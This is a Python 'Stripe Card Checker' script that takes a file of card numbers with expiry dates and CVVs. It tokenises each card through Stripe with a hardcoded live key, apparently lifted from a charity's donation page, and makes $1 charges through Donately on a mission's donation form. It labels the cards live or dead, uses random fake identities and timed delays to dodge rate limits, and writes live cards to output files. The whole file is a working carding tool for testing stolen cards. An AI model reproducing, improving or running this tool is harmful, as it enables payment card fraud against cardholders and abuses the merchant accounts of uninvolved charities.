"""
Pydroid Card Checker - Stripe Auth Gateway v2.1
Full checkout flow with real card authorization
Format: cc|mm|yy|cvv (one per line)
"""

import requests
import json
import random
import string
import time
import re
import os
import uuid
from datetime import datetime


VERSION = "2.3"


class StripeChecker:
    def __init__(self, debug=False):
        self.debug = debug
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        
    def log_debug(self, title, data):
        """Print debug information"""
        if self.debug:
            print(f"\n{'#'*55}")
            print(f"### [DEBUG] {title}")
            print(f"{'#'*55}")
            if isinstance(data, dict):
                for key, value in data.items():
                    str_val = str(value)
                    if len(str_val) > 300:
                        str_val = str_val[:300] + "..."
                    print(f"  {key}: {str_val}")
            else:
                print(f"  {data}")
            print(f"{'#'*55}")

    def generate_email(self):
        """Generate random email"""
        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        return f"{name}{random.randint(100, 999)}@gmail.com"
    
    def generate_name(self):
        """Generate random name"""
        first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
        return random.choice(first_names), random.choice(last_names)

    def create_stripe_token(self, cc, month, year, cvv, pk_key):
        """Create Stripe token for card"""
        
        first_name, last_name = self.generate_name()
        
        url = 'https://api.stripe.com/v1/tokens'
        
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }
        
        # Format year properly
        if len(year) == 4:
            exp_year = year
        elif len(year) == 2:
            exp_year = '20' + year
        else:
            exp_year = year
        
        data = {
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': month.zfill(2),
            'card[exp_year]': exp_year,
            'card[name]': f'{first_name} {last_name}',
            'key': pk_key,
        }
        
        self.log_debug("STRIPE TOKEN REQUEST", {
            'url': url,
            'card': f"{cc[:6]}******{cc[-4:]}",
            'exp': f"{month}/{year}",
            'pk_key': pk_key[:30] + '...'
        })
        
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            result = response.json()
            
            self.log_debug("STRIPE TOKEN RESPONSE", {
                'status_code': response.status_code,
                'response': result
            })
            
            return response.status_code, result
            
        except Exception as e:
            self.log_debug("STRIPE ERROR", str(e))
            return 0, {'error': {'message': str(e)}}

    def create_payment_method(self, cc, month, year, cvv, pk_key):
        """Create Stripe payment method"""
        
        first_name, last_name = self.generate_name()
        email = self.generate_email()
        
        url = 'https://api.stripe.com/v1/payment_methods'
        
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }
        
        if len(year) == 2:
            exp_year = year
        else:
            exp_year = year[-2:]
        
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': exp_year,
            'card[exp_month]': month.zfill(2),
            'billing_details[name]': f'{first_name} {last_name}',
            'billing_details[email]': email,
            'billing_details[address][country]': 'US',
            'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
            'key': pk_key,
        }
        
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            return response.status_code, response.json(), f'{first_name} {last_name}', email
        except Exception as e:
            return 0, {'error': {'message': str(e)}}, '', ''

    def confirm_payment_intent(self, client_secret, pm_id, pk_key):
        """Confirm a payment intent - this is where real validation happens"""
        
        # Extract payment intent ID from client secret
        pi_id = client_secret.split('_secret_')[0]
        
        url = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'
        
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }
        
        data = {
            'payment_method': pm_id,
            'client_secret': client_secret,
            'key': pk_key,
        }
        
        self.log_debug("CONFIRM PAYMENT INTENT", {
            'pi_id': pi_id,
            'pm_id': pm_id
        })
        
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            result = response.json()
            
            self.log_debug("CONFIRM RESPONSE", {
                'status_code': response.status_code,
                'response': result
            })
            
            return response.status_code, result
        except Exception as e:
            return 0, {'error': {'message': str(e)}}

    def check_with_braintree_style(self, cc, month, year, cvv):
        """
        Use a Braintree-style authorization check
        This attempts to validate the card through a real merchant
        """
        
        # Try multiple gateways
        gateways = [
            self.check_gateway_1,
            self.check_gateway_2,
        ]
        
        for gateway in gateways:
            try:
                result = gateway(cc, month, year, cvv)
                if result.get('status') != 'ERROR':
                    return result
            except Exception as e:
                self.log_debug("Gateway Error", str(e))
                continue
        
        return {
            'success': False,
            'status': 'ERROR',
            'message': 'All gateways failed',
            'code': 'gateway_error'
        }

    def check_gateway_1(self, cc, month, year, cvv):
        """Gateway 1: Donately Stripe - Token + Charge"""
        
        pk_key = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX'
        
        first_name, last_name = self.generate_name()
        email = self.generate_email()
        
        # Create token using Stripe tokens API
        url = 'https://api.stripe.com/v1/tokens'
        
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }
        
        if len(year) == 2:
            exp_year = '20' + year
        else:
            exp_year = year
        
        data = {
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': exp_year,
            'card[exp_month]': month.zfill(2),
            'card[name]': f'{first_name} {last_name}',
            'card[address_country]': 'US',
            'key': pk_key,
        }
        
        self.log_debug("GATEWAY 1 - CREATE TOKEN", {
            'card': f"{cc[:6]}******{cc[-4:]}",
            'exp': f"{month}/{exp_year}"
        })
        
        response = self.session.post(url, headers=headers, data=data, timeout=30)
        result = response.json()
        
        self.log_debug("GATEWAY 1 - TOKEN RESPONSE", {
            'status': response.status_code,
            'result': result
        })
        
        if response.status_code != 200 or 'error' in result:
            return self.parse_stripe_error(result)
        
        token_id = result.get('id')
        if not token_id:
            return {'success': False, 'status': 'ERROR', 'message': 'No token', 'code': 'no_token'}
        
        # Now charge with Donately
        import hashlib
        charge_url = f"https://api.donately.com/v2/donations?account_id=act_f9b102ae7299&donation_type=cc&amount_in_cents=100&form_id=frm_5cb29a5d6955&x1={hashlib.md5(str(time.time()).encode()).hexdigest()}"
        
        charge_headers = {
            'Accept': '*/*',
            'Content-Type': 'application/json; charset=UTF-8',
            'Donately-Version': '2022-12-15',
            'Origin': 'https://www-christwaymission-com.filesusr.com',
            'Referer': 'https://www-christwaymission-com.filesusr.com/',
        }
        
        import json as json_lib
        charge_payload = {
            'first_name': first_name,
            'last_name': last_name,
            'email': email,
            'currency': 'USD',
            'recurring': False,
            'country': 'US',
            'payment_auth': json_lib.dumps({'stripe_token': token_id}),
            'form': json_lib.dumps({'version': '5.8.117', 'id': 'frm_5cb29a5d6955'})
        }
        
        self.log_debug("GATEWAY 1 - CHARGE REQUEST", {
            'token': token_id[:20] + '...',
            'amount': '$1.00'
        })
        
        charge_response = self.session.post(charge_url, headers=charge_headers, json=charge_payload, timeout=30)
        charge_result = charge_response.json()
        
        self.log_debug("GATEWAY 1 - CHARGE RESPONSE", {
            'status': charge_response.status_code,
            'result': charge_result
        })
        
        return self.parse_donately_response(charge_result)
    
    def parse_donately_response(self, result):
        """Parse Donately charge response"""
        
        # Check for successful donation
        if result.get('object') == 'donation':
            data = result.get('data', {})
            if data.get('status') == 'processed':
                return {
                    'success': True,
                    'status': 'CHARGED',
                    'message': f"Charged $1.00 [ID: {data.get('id', 'N/A')}]",
                    'code': 'charged'
                }
        
        # Get error message
        error_msg = result.get('message', '')
        error_lower = error_msg.lower()
        
        # CVV related
        if any(x in error_lower for x in ['cvc', 'cvv', 'security']):
            return {'success': False, 'status': 'CCN', 'message': 'CVV Error - Card Live', 'code': 'ccn'}
        
        # Insufficient funds
        if 'insufficient' in error_lower:
            return {'success': False, 'status': 'LIVE', 'message': 'Insufficient Funds', 'code': 'insufficient'}
        
        # 3D Secure
        if '3d' in error_lower or 'auth' in error_lower:
            return {'success': False, 'status': 'LIVE', 'message': '3DS Required - Card Live', 'code': '3ds'}
        
        # Generic decline
        if 'decline' in error_lower:
            return {'success': False, 'status': 'DECLINED', 'message': error_msg, 'code': 'declined'}
        
        # Rate limit
        if 'rate' in error_lower or 'limit' in error_lower:
            return {'success': False, 'status': 'RATE_LIMITED', 'message': 'Rate Limited', 'code': 'rate_limit'}
        
        return {'success': False, 'status': 'DECLINED', 'message': error_msg or 'Unknown', 'code': 'unknown'}

    def check_gateway_2(self, cc, month, year, cvv):
        """Gateway 2: Alternative Stripe merchant (Donately)"""
        
        pk_key = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX'
        
        first_name, last_name = self.generate_name()
        email = self.generate_email()
        
        # Create token instead of payment method
        url = 'https://api.stripe.com/v1/tokens'
        
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }
        
        if len(year) == 2:
            exp_year = '20' + year
        else:
            exp_year = year
        
        data = {
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': exp_year,
            'card[exp_month]': month.zfill(2),
            'card[name]': f'{first_name} {last_name}',
            'card[address_zip]': str(random.randint(10000, 99999)),
            'card[address_country]': 'US',
            'key': pk_key,
        }
        
        self.log_debug("GATEWAY 2 - CREATE TOKEN", {
            'card': f"{cc[:6]}******{cc[-4:]}",
            'exp': f"{month}/{exp_year}"
        })
        
        response = self.session.post(url, headers=headers, data=data, timeout=30)
        result = response.json()
        
        self.log_debug("GATEWAY 2 - TOKEN RESPONSE", {
            'status': response.status_code,
            'result': result
        })
        
        if response.status_code != 200 or 'error' in result:
            return self.parse_stripe_error(result)
        
        # Token created - check card details from response
        card_info = result.get('card', {})
        cvc_check = card_info.get('cvc_check')
        address_zip_check = card_info.get('address_zip_check')
        
        # If we get here, card format is valid but we need actual auth
        # The token response includes some validation info
        
        if cvc_check == 'fail':
            return {
                'success': False,
                'status': 'CCN',
                'message': 'CVV Check Failed - Card Exists',
                'code': 'cvc_check_fail'
            }
        
        # Token was created - card format is valid
        # But we haven't done actual bank authorization yet
        # Return as "needs verification"
        
        token_id = result.get('id')
        brand = card_info.get('brand', 'Unknown')
        last4 = card_info.get('last4', '****')
        
        return {
            'success': True,
            'status': 'VALID',
            'message': f'Token Created - {brand} ****{last4} [{token_id[:15]}...]',
            'code': 'token_created'
        }

    def parse_stripe_error(self, result):
        """Parse Stripe error response"""
        
        error = result.get('error', {})
        error_type = error.get('type', '')
        error_code = error.get('code', '')
        error_decline = error.get('decline_code', '')
        error_message = error.get('message', 'Unknown error')
        
        # Card number errors - DEAD
        if error_code in ['incorrect_number', 'invalid_number']:
            return {
                'success': False,
                'status': 'DEAD',
                'message': 'Invalid Card Number',
                'code': error_code
            }
        
        # Expired card - DEAD
        if error_code in ['expired_card', 'invalid_expiry_year', 'invalid_expiry_month']:
            return {
                'success': False,
                'status': 'DEAD',
                'message': 'Card Expired',
                'code': error_code
            }
        
        # CVC errors - CCN
        if error_code in ['incorrect_cvc', 'invalid_cvc']:
            return {
                'success': False,
                'status': 'CCN',
                'message': 'Invalid CVV - Card Exists',
                'code': error_code
            }
        
        # Insufficient funds - LIVE
        if error_decline == 'insufficient_funds':
            return {
                'success': False,
                'status': 'LIVE',
                'message': 'Insufficient Funds - Card Live',
                'code': 'insufficient_funds'
            }
        
        # Do not honor - LIVE
        if error_decline in ['do_not_honor', 'generic_decline']:
            return {
                'success': False,
                'status': 'DECLINED',
                'message': f'Declined [{error_decline}]',
                'code': error_decline
            }
        
        # 3D Secure - LIVE
        if error_decline in ['authentication_required', 'three_d_secure_required']:
            return {
                'success': False,
                'status': 'LIVE',
                'message': '3D Secure Required - Card Live',
                'code': '3ds'
            }
        
        # Lost/Stolen - DEAD
        if error_decline in ['lost_card', 'stolen_card']:
            return {
                'success': False,
                'status': 'DEAD',
                'message': 'Lost/Stolen Card',
                'code': error_decline
            }
        
        # Card declined
        if error_code == 'card_declined':
            return {
                'success': False,
                'status': 'DECLINED',
                'message': f'Card Declined [{error_decline or "generic"}]',
                'code': error_decline or 'declined'
            }
        
        return {
            'success': False,
            'status': 'DECLINED',
            'message': error_message,
            'code': error_code or 'unknown'
        }

    def parse_setup_intent_response(self, result):
        """Parse SetupIntent response for card validation"""
        
        if 'error' in result:
            return self.parse_stripe_error(result)
        
        status = result.get('status', '')
        
        if status == 'succeeded':
            return {
                'success': True,
                'status': 'LIVE',
                'message': 'Card Validated Successfully',
                'code': 'setup_succeeded'
            }
        
        if status == 'requires_action':
            return {
                'success': False,
                'status': 'LIVE',
                'message': '3D Secure Required - Card Live',
                'code': '3ds_required'
            }
        
        if status == 'requires_payment_method':
            last_error = result.get('last_payment_error', {})
            if last_error:
                return self.parse_stripe_error({'error': last_error})
        
        return {
            'success': False,
            'status': 'UNKNOWN',
            'message': f'Status: {status}',
            'code': status
        }

    def process_card(self, cc, month, year, cvv):
        """Process a single card"""
        return self.check_with_braintree_style(cc, month, year, cvv)


def extract_card(line):
    """Extract card details from line"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    for sep in ['|', ':', ' ']:
        parts = line.split(sep)
        if len(parts) >= 4:
            cc = parts[0].strip().replace(' ', '')
            month = parts[1].strip()
            year = parts[2].strip()
            cvv = parts[3].strip()
            
            if cc.isdigit() and 13 <= len(cc) <= 19:
                if month.isdigit() and len(month) <= 2:
                    if year.isdigit() and len(year) >= 2:
                        if cvv.isdigit() and len(cvv) >= 3:
                            month = month.zfill(2)
                            if len(year) == 4:
                                year = year[2:]
                            return (cc, month, year, cvv)
    return None


def load_cards(filename):
    """Load cards from txt file"""
    cards = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                card = extract_card(line)
                if card:
                    cards.append(card)
    except FileNotFoundError:
        print(f"[!] File not found: {filename}")
    except Exception as e:
        print(f"[!] Error reading file: {e}")
    return cards


def save_result(filename, card_line, result):
    """Append result to output file"""
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"{card_line} | {result}\n")
    except:
        pass


def get_card_type(cc):
    """Determine card type"""
    if cc.startswith('4'):
        return 'VISA'
    elif cc.startswith(('51', '52', '53', '54', '55', '22', '23', '24', '25', '26', '27')):
        return 'MASTERCARD'
    elif cc.startswith(('34', '37')):
        return 'AMEX'
    elif cc.startswith('6'):
        return 'DISCOVER'
    return 'UNKNOWN'


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    print(f"""
╔══════════════════════════════════════════════════════╗
║       STRIPE CARD CHECKER - PYDROID VERSION          ║
║          Multi-Gateway Auth Checker                  ║
║                   Version: {VERSION}                       ║
╠══════════════════════════════════════════════════════╣
║  Format: cc|mm|yy|cvv  (one per line in cards.txt)   ║
╚══════════════════════════════════════════════════════╝
""")


def print_result(card, result, index, total):
    """Print formatted result"""
    cc, month, year, cvv = card
    card_line = f"{cc}|{month}|{year}|{cvv}"
    card_type = get_card_type(cc)
    
    status = result.get('status', 'ERROR')
    message = result.get('message', 'Unknown')
    code = result.get('code', '')
    
    status_icons = {
        'CHARGED': '[$$] CHARGED',
        'LIVE': '[++] LIVE',
        'VALID': '[OK] VALID',
        'CCN': '[##] CCN',
        'DECLINED': '[--] DECLINED',
        'DEAD': '[xx] DEAD',
        'ERROR': '[!!] ERROR',
        'RATE_LIMITED': '[!!] RATE LIMITED',
        'UNKNOWN': '[??] UNKNOWN'
    }
    
    status_display = status_icons.get(status, f'[??] {status}')
    
    print(f"\n{'='*55}")
    print(f"[{index}/{total}] Card: {cc[:6]}******{cc[-4:]} | {card_type}")
    print(f"  Exp: {month}/{year} | CVV: ***")
    print(f"  Status: {status_display}")
    print(f"  Response: {message}")
    if code:
        print(f"  Code: {code}")
    print(f"{'='*55}")
    
    return card_line, status


def main():
    clear_screen()
    print_banner()
    
    default_file = "cards.txt"
    
    print(f"\n[?] Enter cards file path (default: {default_file})")
    input_file = input(">>> ").strip() or default_file
    
    print(f"\n[?] Enable debug mode? (y/n, default: n)")
    debug_input = input(">>> ").strip().lower()
    debug_mode = debug_input in ['y', 'yes', '1']
    
    print(f"[*] Debug mode: {'ON' if debug_mode else 'OFF'}")
    
    print(f"\n[*] Loading cards from: {input_file}")
    cards = load_cards(input_file)
    
    if not cards:
        print("[!] No valid cards found!")
        return
    
    print(f"[+] Loaded {len(cards)} cards")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    live_file = f"live_{timestamp}.txt"
    dead_file = f"dead_{timestamp}.txt"
    
    stats = {'live': 0, 'valid': 0, 'ccn': 0, 'declined': 0, 'dead': 0, 'errors': 0}
    
    checker = StripeChecker(debug=debug_mode)
    
    print(f"\n[*] Starting checker...")
    print(f"[*] Output: {live_file}, {dead_file}")
    print(f"\n{'='*55}")
    
    start_time = time.time()
    
    for idx, card in enumerate(cards, 1):
        cc, month, year, cvv = card
        
        try:
            result = checker.process_card(cc, month, year, cvv)
            card_line, status = print_result(card, result, idx, len(cards))
            
            if status in ['LIVE', 'VALID', 'CHARGED']:
                stats['live'] += 1
                save_result(live_file, card_line, f"{status} | {result.get('message', '')}")
            elif status == 'CCN':
                stats['ccn'] += 1
                save_result(live_file, card_line, f"CCN | {result.get('message', '')}")
            elif status == 'DEAD':
                stats['dead'] += 1
                save_result(dead_file, card_line, f"DEAD | {result.get('message', '')}")
            else:
                stats['declined'] += 1
                save_result(dead_file, card_line, f"DECLINED | {result.get('message', '')}")
            
            time.sleep(random.uniform(2.5, 4.5))
            
        except Exception as e:
            stats['errors'] += 1
            print(f"\n[!] Error: {e}")
            time.sleep(2)
    
    elapsed = time.time() - start_time
    
    print(f"\n{'='*55}")
    print("              COMPLETE")
    print(f"{'='*55}")
    print(f"  Total: {len(cards)} | Live: {stats['live']} | CCN: {stats['ccn']}")
    print(f"  Declined: {stats['declined']} | Dead: {stats['dead']} | Errors: {stats['errors']}")
    print(f"  Time: {elapsed:.2f}s")
    print(f"{'='*55}\n")


if __name__ == "__main__":
    main()
